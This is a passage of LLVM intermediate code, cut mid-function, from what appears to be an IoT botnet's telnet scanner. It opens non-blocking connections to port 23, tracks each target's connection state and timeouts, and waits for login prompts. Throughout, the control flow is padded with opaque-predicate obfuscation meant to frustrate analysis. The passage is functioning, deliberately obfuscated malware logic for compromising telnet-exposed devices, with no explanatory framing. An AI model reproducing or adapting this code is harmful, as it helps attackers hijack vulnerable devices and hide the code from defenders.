  br i1 %200, label %201, label %212

; <label>:201:                                    ; preds = %187
  %202 = load i32, i32* %2, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %203
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %204, i32 0, i32 5
  store i8 0, i8* %205, align 1
  %206 = load i32, i32* %2, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %207
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %208, i32 0, i32 4
  %210 = load i8, i8* %209, align 2
  %211 = add i8 %210, 1
  store i8 %211, i8* %209, align 2
  br label %212

; <label>:212:                                    ; preds = %201, %187
  %213 = load i32, i32* %2, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 4
  %217 = load i8, i8* %216, align 2
  %218 = zext i8 %217 to i64
  %219 = icmp eq i64 %218, 19
  br i1 %219, label %220, label %225

; <label>:220:                                    ; preds = %212
  %221 = load i32, i32* %2, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %222
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %223, i32 0, i32 3
  store i8 1, i8* %224, align 1
  br label %1548

; <label>:225:                                    ; preds = %212
  br label %226

; <label>:226:                                    ; preds = %225, %originalBBpart216
  %227 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %227, align 4
  %228 = call zeroext i16 @htons(i16 zeroext 23) #13
  %229 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %228, i16* %229, align 2
  %230 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %231 = getelementptr inbounds [8 x i8], [8 x i8]* %230, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %231, i8 0, i64 8, i32 4, i1 false)
  %232 = load i32, i32* %2, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %233
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %234, i32 0, i32 1
  %236 = load i32, i32* %235, align 4
  %237 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %238 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %237, i32 0, i32 0
  store i32 %236, i32* %238, align 4
  %239 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %240 = load i32, i32* %2, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %241
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %242, i32 0, i32 0
  store i32 %239, i32* %243, align 16
  %244 = load i32, i32* %2, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %245
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %246, i32 0, i32 0
  %248 = load i32, i32* %247, align 16
  %249 = bitcast %struct.timeval* %10 to i8*
  %250 = call i32 @setsockopt(i32 %248, i32 1, i32 20, i8* %249, i32 16) #2
  %251 = load i32, i32* %2, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %252
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %253, i32 0, i32 0
  %255 = load i32, i32* %254, align 16
  %256 = bitcast %struct.timeval* %10 to i8*
  %257 = call i32 @setsockopt(i32 %255, i32 1, i32 21, i8* %256, i32 16) #2
  %258 = load i32, i32* %2, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %259
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %260, i32 0, i32 0
  %262 = load i32, i32* %261, align 16
  %263 = icmp eq i32 %262, -1
  br i1 %263, label %264, label %281

; <label>:264:                                    ; preds = %226
  %265 = load i32, i32* @x.63
  %266 = load i32, i32* @y.64
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %264
  %273 = load i32, i32* @x.63
  %274 = load i32, i32* @y.64
  %275 = sub i32 %273, 1
  %276 = mul i32 %273, %275
  %277 = urem i32 %276, 2
  %278 = icmp eq i32 %277, 0
  %279 = icmp slt i32 %274, 10
  %280 = or i1 %278, %279
  br i1 %280, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %1548

; <label>:281:                                    ; preds = %226
  %282 = load i32, i32* %2, align 4
  %283 = sext i32 %282 to i64
  %284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %283
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %284, i32 0, i32 0
  %286 = load i32, i32* %285, align 16
  %287 = load i32, i32* %2, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %288
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %289, i32 0, i32 0
  %291 = load i32, i32* %290, align 16
  %292 = call i32 (i32, i32, ...) @fcntl(i32 %291, i32 3, i8* null)
  %293 = or i32 %292, 2048
  %294 = call i32 (i32, i32, ...) @fcntl(i32 %286, i32 4, i32 %293)
  %295 = load i32, i32* %2, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %296
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %297, i32 0, i32 0
  %299 = load i32, i32* %298, align 16
  %300 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %301 = call i32 @connect(i32 %299, %struct.sockaddr* %300, i32 16)
  %302 = icmp eq i32 %301, -1
  br i1 %302, label %303, label %318

; <label>:303:                                    ; preds = %281
  %304 = call i32* @__errno_location() #13
  %305 = load i32, i32* %304, align 4
  %306 = icmp ne i32 %305, 115
  br i1 %306, label %307, label %318

; <label>:307:                                    ; preds = %303
  %308 = load i32, i32* %2, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %309
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %310, i32 0, i32 0
  %312 = load i32, i32* %311, align 16
  %313 = call i32 @sclose(i32 %312)
  %314 = load i32, i32* %2, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %315
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %316, i32 0, i32 3
  store i8 1, i8* %317, align 1
  br label %343

; <label>:318:                                    ; preds = %303, %281
  %319 = load i32, i32* @x.63
  %320 = load i32, i32* @y.64
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %318
  %327 = load i32, i32* %2, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %328
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %329, i32 0, i32 2
  store i8 1, i8* %330, align 8
  %331 = load i32, i32* %2, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %332
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %333, i32 0, i32 6
  store i32 0, i32* %334, align 4
  %335 = load i32, i32* @x.63
  %336 = load i32, i32* @y.64
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %343

; <label>:343:                                    ; preds = %originalBBpart224, %307
  %344 = load i32, i32* @x.63
  %345 = load i32, i32* @y.64
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %343
  %352 = load i32, i32* @x.63
  %353 = load i32, i32* @y.64
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %1531

; <label>:360:                                    ; preds = %116
  %361 = load i32, i32* %2, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %362
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %363, i32 0, i32 6
  %365 = load i32, i32* %364, align 4
  %366 = icmp eq i32 %365, 0
  br i1 %366, label %367, label %389

; <label>:367:                                    ; preds = %360
  %368 = load i32, i32* @x.63
  %369 = load i32, i32* @y.64
  %370 = sub i32 %368, 1
  %371 = mul i32 %368, %370
  %372 = urem i32 %371, 2
  %373 = icmp eq i32 %372, 0
  %374 = icmp slt i32 %369, 10
  %375 = or i1 %373, %374
  br i1 %375, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %367
  %376 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %377 = load i32, i32* %2, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %378
  %380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %379, i32 0, i32 6
  store i32 %376, i32* %380, align 4
  %381 = load i32, i32* @x.63
  %382 = load i32, i32* @y.64
  %383 = sub i32 %381, 1
  %384 = mul i32 %381, %383
  %385 = urem i32 %384, 2
  %386 = icmp eq i32 %385, 0
  %387 = icmp slt i32 %382, 10
  %388 = or i1 %386, %387
  br i1 %388, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %389

; <label>:389:                                    ; preds = %originalBBpart232, %360
  %390 = load i32, i32* @x.63
  %391 = load i32, i32* @y.64
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %389
  %398 = load i32, i32* @x.63
  %399 = load i32, i32* @y.64
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %406

; <label>:406:                                    ; preds = %originalBBpart236
  %407 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %408 = getelementptr inbounds [16 x i64], [16 x i64]* %407, i64 0, i64 0
  %409 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %408) #2, !srcloc !5
  %410 = extractvalue { i64, i64* } %409, 0
  %411 = extractvalue { i64, i64* } %409, 1
  %412 = trunc i64 %410 to i32
  store i32 %412, i32* %12, align 4
  %413 = ptrtoint i64* %411 to i64
  %414 = trunc i64 %413 to i32
  store i32 %414, i32* %13, align 4
  br label %415

; <label>:415:                                    ; preds = %406
  br label %416

; <label>:416:                                    ; preds = %415
  %417 = load i32, i32* %2, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %418
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %419, i32 0, i32 0
  %421 = load i32, i32* %420, align 16
  %422 = srem i32 %421, 64
  %423 = zext i32 %422 to i64
  %424 = shl i64 1, %423
  %425 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %426 = load i32, i32* %2, align 4
  %427 = sext i32 %426 to i64
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %427
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %428, i32 0, i32 0
  %430 = load i32, i32* %429, align 16
  %431 = sdiv i32 %430, 64
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds [16 x i64], [16 x i64]* %425, i64 0, i64 %432
  %434 = load i64, i64* %433, align 8
  %435 = or i64 %434, %424
  store i64 %435, i64* %433, align 8
  %436 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %436, align 8
  %437 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %437, align 8
  %438 = load i32, i32* %2, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %439
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %440, i32 0, i32 0
  %442 = load i32, i32* %441, align 16
  %443 = add nsw i32 %442, 1
  %444 = call i32 @select(i32 %443, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %444, i32* %3, align 4
  %445 = load i32, i32* %3, align 4
  %446 = icmp eq i32 %445, 1
  br i1 %446, label %447, label %504

; <label>:447:                                    ; preds = %416
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %448 = load i32, i32* %2, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 0
  %452 = load i32, i32* %451, align 16
  %453 = bitcast i32* %7 to i8*
  %454 = call i32 @getsockopt(i32 %452, i32 1, i32 4, i8* %453, i32* %6) #2
  %455 = load i32, i32* %7, align 4
  %456 = icmp ne i32 %455, 0
  br i1 %456, label %457, label %472

; <label>:457:                                    ; preds = %447
  %458 = load i32, i32* %2, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %459
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %460, i32 0, i32 0
  %462 = load i32, i32* %461, align 16
  %463 = call i32 @sclose(i32 %462)
  %464 = load i32, i32* %2, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 2
  store i8 0, i8* %467, align 8
  %468 = load i32, i32* %2, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %469
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %470, i32 0, i32 3
  store i8 1, i8* %471, align 1
  br label %503

; <label>:472:                                    ; preds = %447
  %473 = load i32, i32* %2, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %474
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %475, i32 0, i32 0
  %477 = load i32, i32* %476, align 16
  %478 = load i32, i32* %2, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 0
  %482 = load i32, i32* %481, align 16
  %483 = call i32 (i32, i32, ...) @fcntl(i32 %482, i32 3, i8* null)
  %484 = and i32 %483, -2049
  %485 = call i32 (i32, i32, ...) @fcntl(i32 %477, i32 4, i32 %484)
  %486 = load i32, i32* %2, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 6
  store i32 0, i32* %489, align 4
  %490 = load i32, i32* %2, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %491
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %492, i32 0, i32 7
  store i16 0, i16* %493, align 16
  %494 = load i32, i32* %2, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %495
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %496, i32 0, i32 8
  %498 = load i8*, i8** %497, align 8
  call void @llvm.memset.p0i8.i64(i8* %498, i8 0, i64 1024, i32 1, i1 false)
  %499 = load i32, i32* %2, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %500
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %501, i32 0, i32 2
  store i8 2, i8* %502, align 8
  br label %1548

; <label>:503:                                    ; preds = %457
  br label %523

; <label>:504:                                    ; preds = %416
  %505 = load i32, i32* %3, align 4
  %506 = icmp eq i32 %505, -1
  br i1 %506, label %507, label %522

; <label>:507:                                    ; preds = %504
  %508 = load i32, i32* %2, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %509
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %510, i32 0, i32 0
  %512 = load i32, i32* %511, align 16
  %513 = call i32 @sclose(i32 %512)
  %514 = load i32, i32* %2, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %515
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %516, i32 0, i32 2
  store i8 0, i8* %517, align 8
  %518 = load i32, i32* %2, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %519
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %520, i32 0, i32 3
  store i8 1, i8* %521, align 1
  br label %522

; <label>:522:                                    ; preds = %507, %504
  br label %523

; <label>:523:                                    ; preds = %522, %503
  %524 = load i32, i32* @x.63
  %525 = load i32, i32* @y.64
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %523
  %532 = load i32, i32* %2, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %533
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %534, i32 0, i32 6
  %536 = load i32, i32* %535, align 4
  %537 = add i32 %536, 5
  %538 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %539 = icmp ult i32 %537, %538
  %540 = load i32, i32* @x.63
  %541 = load i32, i32* @y.64
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBBpart249, label %originalBB38alteredBB

originalBBpart249:                                ; preds = %originalBB38
  br i1 %539, label %548, label %563

; <label>:548:                                    ; preds = %originalBBpart249
  %549 = load i32, i32* %2, align 4
  %550 = sext i32 %549 to i64
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %550
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %551, i32 0, i32 0
  %553 = load i32, i32* %552, align 16
  %554 = call i32 @sclose(i32 %553)
  %555 = load i32, i32* %2, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %556
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %557, i32 0, i32 2
  store i8 0, i8* %558, align 8
  %559 = load i32, i32* %2, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %560
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %561, i32 0, i32 3
  store i8 1, i8* %562, align 1
  br label %563

; <label>:563:                                    ; preds = %548, %originalBBpart249
  br label %1531

; <label>:564:                                    ; preds = %116
  %565 = load i32, i32* %2, align 4
  %566 = sext i32 %565 to i64
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %566
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %567, i32 0, i32 6
  %569 = load i32, i32* %568, align 4
  %570 = icmp eq i32 %569, 0
  br i1 %570, label %571, label %577

; <label>:571:                                    ; preds = %564
  %572 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %573 = load i32, i32* %2, align 4
  %574 = sext i32 %573 to i64
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %574
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %575, i32 0, i32 6
  store i32 %572, i32* %576, align 4
  br label %577

; <label>:577:                                    ; preds = %571, %564
  %578 = load i32, i32* %2, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %579
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %580, i32 0, i32 8
  %582 = load i8*, i8** %581, align 8
  %583 = call i32 @matchPrompt(i8* %582)
  %584 = icmp ne i32 %583, 0
  br i1 %584, label %585, label %590

; <label>:585:                                    ; preds = %577
  %586 = load i32, i32* %2, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 2
  store i8 7, i8* %589, align 8
  br label %590

; <label>:590:                                    ; preds = %585, %577
  %591 = load i32, i32* %2, align 4
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %592
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %593, i32 0, i32 0
  %595 = load i32, i32* %594, align 16
  %596 = load i32, i32* %2, align 4
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %597
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %598, i32 0, i32 8
  %600 = load i8*, i8** %599, align 8
  %601 = load i32, i32* %2, align 4
  %602 = sext i32 %601 to i64
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %602
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %603, i32 0, i32 7
  %605 = load i16, i16* %604, align 16
  %606 = zext i16 %605 to i32
  %607 = call i32 @readUntil(i32 %595, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %600, i32 1024, i32 %606)
  %608 = icmp ne i32 %607, 0
  br i1 %608, label %609, label %627

; <label>:609:                                    ; preds = %590
  %610 = load i32, i32* %2, align 4
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %611
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %612, i32 0, i32 6
  store i32 0, i32* %613, align 4
  %614 = load i32, i32* %2, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %615
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %616, i32 0, i32 7
  store i16 0, i16* %617, align 16
  %618 = load i32, i32* %2, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %619
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %620, i32 0, i32 8
  %622 = load i8*, i8** %621, align 8
  call void @llvm.memset.p0i8.i64(i8* %622, i8 0, i64 1024, i32 1, i1 false)
  %623 = load i32, i32* %2, align 4
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %624
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %625, i32 0, i32 2
  store i8 3, i8* %626, align 8
  br label %1548

; <label>:627:                                    ; preds = %590
  %628 = load i32, i32* @x.63
  %629 = load i32, i32* @y.64
  %630 = sub i32 %628, 1
  %631 = mul i32 %628, %630
  %632 = urem i32 %631, 2
  %633 = icmp eq i32 %632, 0
  %634 = icmp slt i32 %629, 10
  %635 = or i1 %633, %634
  br i1 %635, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %627
  %636 = load i32, i32* %2, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %637
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %638, i32 0, i32 8
  %640 = load i8*, i8** %639, align 8
  %641 = call i64 @strlen(i8* %640) #10
  %642 = trunc i64 %641 to i16
  %643 = load i32, i32* %2, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %644
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %645, i32 0, i32 7
  store i16 %642, i16* %646, align 16
  %647 = load i32, i32* @x.63
  %648 = load i32, i32* @y.64
  %649 = sub i32 %647, 1
  %650 = mul i32 %647, %649
  %651 = urem i32 %650, 2
  %652 = icmp eq i32 %651, 0
  %653 = icmp slt i32 %648, 10
  %654 = or i1 %652, %653
  br i1 %654, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %655

; <label>:655:                                    ; preds = %originalBBpart253
  %656 = load i32, i32* %2, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %657
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %658, i32 0, i32 6
  %660 = load i32, i32* %659, align 4
  %661 = add i32 %660, 30
  %662 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %663 = icmp ult i32 %661, %662
  br i1 %663, label %664, label %679

; <label>:664:                                    ; preds = %655
  %665 = load i32, i32* %2, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %666
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %667, i32 0, i32 0
  %669 = load i32, i32* %668, align 16
  %670 = call i32 @sclose(i32 %669)
  %671 = load i32, i32* %2, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %672
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %673, i32 0, i32 2
  store i8 0, i8* %674, align 8
  %675 = load i32, i32* %2, align 4
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %676
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %677, i32 0, i32 3
  store i8 1, i8* %678, align 1
  br label %679

; <label>:679:                                    ; preds = %664, %655
  %680 = load i32, i32* @x.63
  %681 = load i32, i32* @y.64
  %682 = sub i32 %680, 1
  %683 = mul i32 %680, %682
  %684 = urem i32 %683, 2
  %685 = icmp eq i32 %684, 0
  %686 = icmp slt i32 %681, 10
  %687 = or i1 %685, %686
  br i1 %687, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %679
  %688 = load i32, i32* @x.63
  %689 = load i32, i32* @y.64
  %690 = sub i32 %688, 1
  %691 = mul i32 %688, %690
  %692 = urem i32 %691, 2
  %693 = icmp eq i32 %692, 0
  %694 = icmp slt i32 %689, 10
  %695 = or i1 %693, %694
  br i1 %695, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %1531

; <label>:696:                                    ; preds = %116
  %697 = load i32, i32* @x.63
  %698 = load i32, i32* @y.64
  %699 = sub i32 %697, 1
  %700 = mul i32 %697, %699
  %701 = urem i32 %700, 2
  %702 = icmp eq i32 %701, 0
